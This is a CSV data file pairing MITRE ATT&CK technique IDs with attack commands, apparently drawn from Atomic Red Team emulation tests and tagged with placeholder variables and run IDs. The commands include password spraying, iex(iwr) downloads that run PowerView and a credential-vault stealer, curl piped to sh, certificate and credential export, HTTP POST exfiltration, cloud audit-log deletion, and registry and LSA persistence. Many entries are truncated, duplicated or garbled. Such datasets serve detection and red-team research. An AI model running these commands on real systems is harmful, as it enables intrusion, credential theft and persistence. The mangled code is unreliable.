mitre_id,command
T1110,"@for /f %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\ipc$ /user:""%userdomain%\%n"" ""#{password}"" 1>nul 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\ipc$ > nul"
T1526,"import-module  ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1""  $access_key  =  ""var_14168"""
T1098,gcloud config set project var_428.iam.gserviceaccount.com --quiet
T1053,"echo ""#{at_command}"" | at #{time_spec}"
T1496,yes > /dev/null> /dev/null 2>&1 # id_38
T1553,openssl genrsa -out var_78444 \etc\pki\ca-trust\source\anchors\ update-ca-trust
T1529,"echo """" | ""var_468"""
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_357"""
T1187,"&  ""var_63180  write-host  ""end  of  petitpotam  attack"""
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_263"" net start sesshijack"
T1570,net use * '#{remote_path}' /transport:quic /skipcertcheck copy '#{local_file}' '*:\'> /dev/null 2>&1 # id_72
T1486,openssl enc var_46091
T1078,net  user  var_772  \active:yes
T1041,if(-not  (test-path  var_965  -method  post  -body  $filecontent  -disablekeepalive
T1562,gcloud config set project #{project-id} gcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2factivity --quiet
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_340"""
T1069,"net localgroup net localgroup ""administrators"""
T1547,"reg add ""hkcr\clsid\{645ff040-5081-101b-9f08-00aa002f954e}\shell\open\command"" /ve /d ""calc.exe"" /f"
T1012,reg.exe  query  hklm\system\currentcontrolset\control  \v  systemstartoptions> /dev/null 2>&1 # id_51
T1057,"start-process -filepath ""$env:programfiles\process hacker 2\var_701"""
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_805 write-host ""end of golden saml"""
T1112,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate\au"" /v ""noautoupdate"" /t reg_dword /d 1 /f> /dev/null 2>&1 # id_43"
T1106,$pathtoatomicsfolder\t1106\bin\x64\syscall.exe -debug# run_1473
T1129,"var_71423"""
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""# run_2108"
T1529,shutdown \l# run_4655
T1036,"copy-item ""$env:windir\system32\cmd.exe"" -destination ""$env:allusersprofile\cmd.exe"" start-process ""$env:allusersprofile\cmd.exe"" sleep -s 5 stop-process -name ""cmd"" | out-null"
T1489,sudo pkill -sigterm var_47720
T1567,new-item var_8286:test -v
T1572,"for($i=0; $i -le #{query_volume}; $i++) { (invoke-webrequest ""#{doh_server}?name=#{subdomain}.$(get-random -minimum 1 -maximum 999999).#{domain}&type=#{query_type}"" -usebasicparsing).content }> /dev/null 2>&1 # id_40"
T1518,"get-netfirewallprofile  |  format-table  name,  enabled  get-netfirewallsetting  get-netfirewallrule  |  select  displayname,  enabled,  description> /dev/null 2>&1 # id_38"
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath var_39929"
T1570,net use * 'var_147' '*:\'
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd \c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_18184"")"
T1619,"try{$response = invoke-webrequest ""https:\\var_821 -append"
T1055,"$pathtoatomicsfolder\t1055.012\bin\x64\createprocess.exe -program ""var_771"" -debug"
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""> /dev/null 2>&1 # id_23"
T1123,sh var_47320
T1570,net use * 'var_20764' '*:\'
T1082,"kldstat | grep -i ""vmm"" kldstat | grep -i ""vbox"""
T1613,docker  build  -t  t1613  $pathtoatomicsfolder\t1613\src\  docker  run  --name  t1613_container  --rm  -d  -t  t1613  docker  ps  docker  stats  --no-stream  docker  inspect  $(docker  ps  -l  -q  --filter  ancestor=t1613)> /dev/null 2>&1 # id_59
T1033,set  file=var_98461\user_info_%random%.tmp  echo  username:  %username%  >  %file%  echo  user  domain:  %userdomain%  >>  %file%  net  users  >>  %file%  query  user  >>  %file%
T1569,"cmd.exe  \c  ""wmic  csproduct  get  uuid""  cmd.exe  \c  ""fsutil  behavior  set  symlinkevaluation  r2l:1""  cmd.exe  \c  ""fsutil  behavior  set  symlinkevaluation  r2r:1""  reg  add  hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters  \v  maxmpxct  \d  3663  \t  reg_dword  \f  copy  ""pathtoatomicsfolder\..\externalpayloads\psexec.exe""  $env:temp  cmd.exe  \c  ""$env:temp\psexec.exe  -accepteula  \\var_78988  cmd.exe  \c  echo  ""--access-token"""""
T1609,kubectl create -f var_93575
T1018,"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip up"" || : ; done"
T1113,screencapture var_299
T1606,"import-module  aadinternals  -force  $saml  =  new-aadintsamltoken  -immutableid  ""var_902  write-host  ""end  of  golden  saml"""
T1090,"invoke-expression 'cmd \c start powershell -command {cmd \c ""var_503' sleep -s 60 stop-process -name ""tor"" | out-null"
T1543,"echo ""[unit]"" > var_773"
T1543,sc.exe  create  var_485
T1531,"$pword = convertto-securestring -string #{super_pass} -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist #{super_user}, $pword if((get-aduser #{remove_user} -properties memberof).memberof -like ""cn=domain admins*""){ remove-adgroupmember -identity ""domain admins"" -members #{remove_user} -credential $credential -confirm:$false } else{ write-host ""error - make sure #{remove_user} is in the domain admins group"" -foregroundcolor red }"
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_422"""
T1129,"var_705"""
T1610,docker  build  -t  t1610  $pathtoatomicsfolder\t1610\src\  docker  run  --name  t1610_container  --rm  -itd  t1610  bash  \tmp\script.sh# run_3981
T1113,screencapture -x var_937
T1134,start-process -filepath #{parent_name} -passthru | start-athprocessunderspecificparent -filepath #{file_path} -commandline '#{command_line}'
T1652,kextfind# run_8044
T1012,"new-psdrive -psprovider registry -root hkey_classes_root -name hkcr get-childitem -path hkcr:\clsid -name | select -skip 1 > $env:temp\clsids.txt foreach($clsid in get-content ""$env:temp\clsids.txt"") {try{write-output ""$($position)-$($clsid)"" write-output ""------------""| out-file var_18137"
T1046,nmap -pn -sv -p var_591
T1074,curl -s https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.sh | sh -s > var_63170
T1087,"& ""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" #{optional_args} -h #{domain} -s subtree -f ""objectclass=computer"" *# run_2494"
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""; echo 46 > $null"
T1047,"wmic  \node:""var_848%%'""  call  uninstall"
T1041,"if(-not (test-path #{filepath})){ 1..100 | foreach-object { add-content -path #{filepath} -value ""this is line $_."" } } [system.net.servicepointmanager]::expect100continue = $false $filecontent = get-content -path #{filepath} invoke-webrequest -uri #{destination_url} -method post -body $filecontent -disablekeepalive"
T1069,get-adprincipalgroupmembership var_8019 | select name
T1550,var_999
T1049,$syntaxlist = var_26547
T1606,"import-module  aadinternals  -force  $saml  =  new-aadintsamltoken  -immutableid  ""var_55646  write-host  ""end  of  golden  saml"""
T1220,"""var_987"""
T1140,copy %windir%\system32\certutil.exe %temp%\tcm.tmp %temp%\tcm.tmp -encode var_178 %temp%\t1140_calc2.txt %temp%\tcm.tmp -decode %temp%\t1140_calc2.txt %temp%\t1140_calc2_decoded.exe
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""var_259 -method post -body $cyphertext -disablekeepalive"
T1140,"mkdir  ""var_599""  -f:*  .  popd"
T1007,powershell.exe  get-service; echo 48 > $null
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_430"""
T1037,"echo ""var_28857"" \f"
T1547,"$oldvalue = $(get-itempropertyvalue -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit""); set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit-backup"" -value ""$oldvalue""; $newvalue = $oldvalue + "" var_530""; set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit"" -value ""$newvalue"""
T1552,"""var_136"" ""crypto::certificates \systemstore:local_machine \store:my \export"" exit"
T1046,sudo nmap -ss var_814
T1007,"echo  ""[*]  listing  sysv  init  scripts  (\etc\init.d):""  if  [  -d  \etc\init.d  ];  then  ls  -l  \etc\init.d;  else  echo  ""\etc\init.d  not  present  on  this  system"";  fi  echo  echo  ""[*]  listing  runlevel  directories  (\etc\rc*.d):""  ls  -ld  \etc\rc*.d  2>\dev\null  ||  echo  ""no  \etc\rc*.d  directories  found""# run_6034"
T1037,sudo touch /library/startupitems/evilstartup.plist
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_597\extension\"" -passthru"
T1112,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\system"" /v disablelockworkstation /t reg_dword /d 1 /f"
T1127,"var_468"""
T1219,"start-process -filepath ""c:program files (x86)\splashtop\splashtop remote\server\var_86885"""
T1201,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domainpolicy -verbose> /dev/null 2>&1 # id_50
T1070,sshpass -p 'pwd101!' ssh testuser1@localhost -t hostname
T1556,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""#{dll_path}\#{dll_name}"" -destination ""c:\windows\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $authenticationpackagesvalues = $lsakey.getvalue(""authentication packages"") $authenticationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""authentication packages"" $authenticationpackagesvalues"
T1555,iex (iwr 'https://raw.githubusercontent.com/triggerman-s/windows-credential-manager/4ad208e70c80dd2a9961db40793da291b1981e01/getcredmancreds.ps1' -usebasicparsing); get-passwordvaultcredentials -force
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)# run_6029"
T1611,if [ ! -d var_425 2>&1
T1546,"reg add ""hklm\software\microsoft\windows nt\currentversion\image file execution options\#{target_binary}"" /v globalflag /t reg_dword /d 512 reg add ""hklm\software\microsoft\windows nt\currentversion\silentprocessexit\#{target_binary}"" /v reportingmode /t reg_dword /d 1 reg add ""hklm\software\microsoft\windows nt\currentversion\silentprocessexit\#{target_binary}"" /v monitorprocess /d ""#{payload_binary}"""
T1531,$pword = convertto-securestring -string var_366
T1613,podman build -t t1613 $pathtoatomicsfolder\t1613\src\ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)> /dev/null 2>&1 # id_29
T1140,"encoded=$(perl -e ""use mime::base64;print(encode_base64('var_66107"");print(decode_base64(<$f>));'"
T1615,get-gpo -domain $env:userdnsdomain var_47011
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""> /dev/null 2>&1 # id_97"
T1609,kubectl create -f var_63713
T1010,c:\windows\microsoft.net\framework\v4.0.54389\csc.exe -out:var_35167
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_15835"""
T1127,"copy ""var_33066 \t:library %temp%\libhello.js"
T1005,cd $home curl -o var_554; fi' \;
T1222,chmod #{numeric_mode} #{file_or_folder}
T1059,"# encoded payload in next command is the following ""set-content -path ""$env:systemroot/temp/art-marker.txt"" -value ""hello from the atomic red team"""" reg.exe add ""hkey_current_user\software\classes\atomicredteam"" /v art /t reg_sz /d ""u2v0lunvbnrlbnqglxbhdgggiirlbny6u3lzdgvtum9vdc9uzw1wl2fydc1tyxjrzxiudhh0iiatdmfsdwugikhlbgxvigzyb20gdghlief0b21pyybszwqgvgvhbsi="" /f iex ([text.encoding]::ascii.getstring([convert]::frombase64string((gp 'hkcu:\software\classes\atomicredteam').art)))"
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_91847"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1057,get-wmiobject -class win32_process
T1069,get-adprincipalgroupmembership  var_49862  |  select  name
T1115,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 set-clipboard -value ""atomic t1115 test, grab data from clipboard via vba"" iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1115\src\t1115-macrocode.txt"" -officeproduct ""word"" -sub ""getclipboard"""
T1204,"echo var url = ""var_997"
T1569,launchctl submit -l var_568
T1578,"aws ec2 create-snapshot --region #{aws_region} --volume-id #{aws_volume_id} --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text"
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_490"""
T1573,$server_ip = var_27542
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe""  --pipe  2> /dev/null 2>&1 # id_81"
T1201,cat /etc/pam.d/system-auth cat /etc/security/pwquality.conf# run_5805
T1047,"$class  =  new-object  management.managementclass(new-object  management.managementpath(""win32_process""))  $newclass  =  $class.derive(""var_992"
T1572,"set-location  ""pathtoatomicsfolder""  .\t1572\src\t1572-doh-domain-length.ps1  -dohserver  var_807"
T1197,bitsadmin.exe \transfer \download \priority foreground var_399
T1136,pw useradd var_909 -s \usr\sbin\nologin -d \nonexistent -c evil_account
T1530,"$storage_account_objects = import-csv -path ""var_224"
T1133,"$extlist = var_77694 start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)# run_1222"
